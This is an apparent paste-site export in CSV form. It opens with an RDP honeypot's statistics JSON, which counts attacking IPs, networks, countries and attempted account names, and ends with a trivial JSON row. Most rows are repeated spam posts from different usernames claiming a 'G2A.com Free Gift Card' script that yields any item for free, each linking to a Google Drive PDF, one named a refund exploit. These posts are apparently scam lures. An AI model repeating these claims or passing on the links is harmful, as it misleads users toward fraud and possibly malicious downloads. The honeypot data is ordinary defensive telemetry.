id,title,username,language,date,content
AQh4cszH,2024-06-28_stats.json,rdp_snitch,JSON,Friday 28th of June 2024 07:15:07 PM CDT,"{
  ""ip"": {
    ""104.248.154.46"": 10,
    ""45.227.254.8"": 2,
    ""206.168.34.113"": 1,
    ""194.165.16.10"": 2,
    ""96.51.53.164"": 3,
    ""222.132.26.43"": 2,
    ""223.166.31.100"": 2,
    ""164.92.104.215"": 3,
    ""51.103.90.130"": 1,
    ""205.210.31.110"": 3,
    ""80.66.66.250"": 3,
    ""172.105.126.198"": 1,
    ""98.143.255.25"": 9,
    ""212.70.149.146"": 6,
    ""185.170.144.3"": 2,
    ""87.251.75.120"": 2,
    ""64.124.50.139"": 2,
    ""217.61.16.103"": 2,
    ""93.174.95.106"": 1,
    ""147.185.132.249"": 3,
    ""194.165.16.37"": 2,
    ""45.227.254.115"": 3,
    ""194.165.16.78"": 4,
    ""162.248.225.122"": 4,
    ""213.109.202.252"": 6,
    ""94.232.45.147"": 1,
    ""36.50.226.70"": 1,
    ""94.228.166.29"": 1,
    ""45.227.254.55"": 2,
    ""193.203.238.48"": 1,
    ""194.26.135.155"": 3,
    ""198.235.24.69"": 3,
    ""202.191.57.246"": 1,
    ""87.251.75.211"": 1,
    ""87.251.75.64"": 1,
    ""91.108.245.89"": 1,
    ""60.255.174.158"": 1,
    ""183.80.4.255"": 1,
    ""116.140.196.215"": 1,
    ""205.210.31.92"": 3,
    ""138.68.239.141"": 4,
    ""142.93.88.64"": 1
  },
  ""asn"": {
    ""AS14061"": 18,
    ""AS267784"": 7,
    ""AS398324"": 1,
    ""AS48721"": 8,
    ""AS6327"": 3,
    ""AS4837"": 5,
    ""AS17621"": 2,
    ""AS8075"": 1,
    ""AS396982"": 12,
    ""AS51765"": 3,
    ""AS63949"": 1,
    ""AS3367"": 9,
    ""AS204428"": 6,
    ""AS197414"": 2,
    ""AS208091"": 4,
    ""AS6461"": 2,
    ""AS199883"": 2,
    ""AS202425"": 1,
    ""AS14576"": 4,
    ""AS208312"": 6,
    ""AS212482"": 1,
    ""AS216319"": 1,
    ""AS30823"": 1,
    ""AS57523"": 3,
    ""AS38727"": 1,
    ""AS215590"": 1,
    ""AS18403"": 1
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 18,
    ""Flyservers S.A."": 15,
    ""Censys, Inc."": 1,
    ""Shaw Communications Inc."": 3,
    ""CHINA UNICOM China169 Backbone"": 3,
    ""China Unicom Shanghai Province Network"": 2,
    ""Microsoft"": 1,
    ""Google LLC"": 12,
    ""Oy Crea Nova Hosting Solution Ltd"": 3,
    ""Akamai Technologies"": 1,
    ""Xplornet Communications Inc."": 9,
    ""SS-Net"": 6,
    ""Xhost Internet Solutions LP"": 7,
    ""Zayo Bandwidth"": 2,
    ""ArubaCloud UK Network"": 2,
    ""IP Volume inc"": 1,
    ""Hosting Solution Ltd."": 4,
    ""Red Byte LLC"": 6,
    ""Chromis IT LTD"": 1,
    ""aurologic GmbH"": 1,
    ""Chang Way Technologies Co. Limited"": 3,
    ""HUT"": 1,
    ""DpkgSoft International Limited"": 1,
    ""China Unicom China169 Network"": 1,
    ""Vietnam Internet Network Information Center"": 1,
    ""China Unicom CHINA169 Network"": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 18,
    ""UAB Host Baltic"": 7,
    ""Censys Inc"": 1,
    ""Flyservers S.A"": 8,
    ""Shaw Communications Inc"": 3,
    ""Wfedune EDU"": 2,
    ""Unknown"": 13,
    ""Microsoft Azure Cloud (francecentral)"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 7,
    ""Linode"": 1,
    ""4Media Ltd"": 6,
    ""Xhostis"": 2,
    ""Microsoft Corporation"": 2,
    ""Aruba S.p.A. - CLoud Services"": 2,
    ""IP Volume inc"": 1,
    ""IT Hosting Group"": 4,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Dmitriy Panchenko"": 1,
    ""Hunan Yumiyun Data Technology Co., Ltd."": 1,
    ""1337 Hosting LTD"": 1,
    ""ZAP-Hosting Holding GmbH"": 1,
    ""DpkgSoft International Limited"": 1,
    ""SiChuan Cable TV Network CO., LTD"": 1,
    ""China United Network Communications Corporation Limited"": 1
  },
  ""regionName"": {
    ""Central Singapore"": 10,
    ""Vilnius"": 7,
    ""Illinois"": 1,
    ""Kaunas"": 8,
    ""Alberta"": 3,
    ""Beijing"": 4,
    ""Shanghai"": 2,
    ""California"": 24,
    ""\u00cele-de-France"": 1,
    ""Uusimaa"": 3,
    ""North West"": 1,
    ""New Brunswick"": 9,
    ""Sofia-Capital"": 6,
    ""North Holland"": 7,
    ""Virginia"": 2,
    ""England"": 2,
    ""Moscow"": 10,
    ""Perm Krai"": 1,
    ""Hesse"": 2,
    ""Hanoi"": 2,
    ""Sichuan"": 1
  },
  ""country"": {
    ""Singapore"": 11,
    ""Lithuania"": 15,
    ""United States"": 27,
    ""Canada"": 12,
    ""China"": 7,
    ""France"": 1,
    ""Finland"": 3,
    ""Bulgaria"": 6,
    ""The Netherlands"": 7,
    ""United Kingdom"": 2,
    ""Russia"": 11,
    ""Germany"": 2,
    ""Vietnam"": 2
  },
  ""account"": {
    ""hello"": 38,
    ""Test"": 17,
    ""(empty)"": 6,
    ""QRjIWBhdW"": 1,
    ""NrtMqj"": 1,
    ""unrnBh"": 1,
    ""Administr"": 10,
    ""Domain"": 16,
    ""root"": 1,
    ""USNVTFZpB"": 1,
    ""UVAhRZ"": 1,
    ""qYoVsY"": 1,
    ""leyGTSO"": 1,
    ""GQXjCImmL"": 1,
    ""eMglsO"": 1,
    ""bTqeZm"": 1,
    ""hPqwzNTaD"": 1,
    ""KsjBWK"": 1,
    ""WHtLIh"": 1,
    ""jggv74n7"": 4,
    ""beio"": 1
  },
  ""keyboard"": {
    ""Unknown"": 106
  },
  ""client_build"": {
    ""Unknown"": 106
  },
  ""client_name"": {
    ""Unknown"": 106
  },
  ""ip_type"": {
    ""hosting"": 36,
    ""Unknown"": 55,
    ""hosting & proxy"": 5,
    ""proxy"": 10
  }
}"
5xybj8HK,🤑G2A.com Free Gift Card FIX July 2024🤑,tajdiqul,JavaScript,Friday 28th of June 2024 07:10:43 PM CDT,"G2A.com complimentary voucher & gaming guide.
Any voucher for free on G2A.com including Steam gift cards & anything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
AGV4wZND,🤑G2A.com Free Gift Card FIX July 2024🤑,notgoodatscripting,JavaScript,Friday 28th of June 2024 07:04:35 PM CDT,"G2A.com complimentary voucher & gaming guide.
Any item for free on G2A.com including Playstation gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
LPpZ9e6g,🤑G2A.com Free Gift Card FIX July 2024🤑,bgill55,JavaScript,Friday 28th of June 2024 06:58:32 PM CDT,"G2A.com complimentary gift card & gaming guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
July 1 2024

"
Mb9iQAdu,🤑G2A.com Free Gift Card FIX July 2024🤑,FreeRobux12345,JavaScript,Friday 28th of June 2024 06:52:30 PM CDT,"G2A.com free voucher & gaming guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
psfU1vP0,🤑G2A.com Free Gift Card FIX July 2024🎁,mikyser,JavaScript,Friday 28th of June 2024 06:46:24 PM CDT,"G2A.com free voucher & gaming guide.
Any gift card for free on G2A.com including Amazon gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
AqHnhcP5,🎁 G2A.COM FREE GIFT CARD GUIDE JUN 2024 V4 🎁,jusst2k4,GetText,Friday 28th of June 2024 06:41:41 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_280506.pdf
 
Working as of:
29 June 2024"
QeFTxqzW,🤑G2A.com Free Gift Card FIX July 2024🎁,Ohtaku,JavaScript,Friday 28th of June 2024 06:40:22 PM CDT,"G2A.com free voucher & gaming guide.
Any gift card for free on G2A.com including Amazon gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
70N4hejE,🤑G2A.com Free Gift Card FIX July 2024🤑,Elii,JavaScript,Friday 28th of June 2024 06:34:20 PM CDT,"G2A.com complimentary voucher & gaming guide.
Any item for free on G2A.com including Xbox gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?70259

Working as of:
1st of July 2024

"
AKu7VtX1,Delusive-update,6275,C++,Friday 28th of June 2024 06:29:04 PM CDT,"{
    ""devblog236"": ""11.09.2002"",
    ""alkad"": ""11.09.2003""
}"
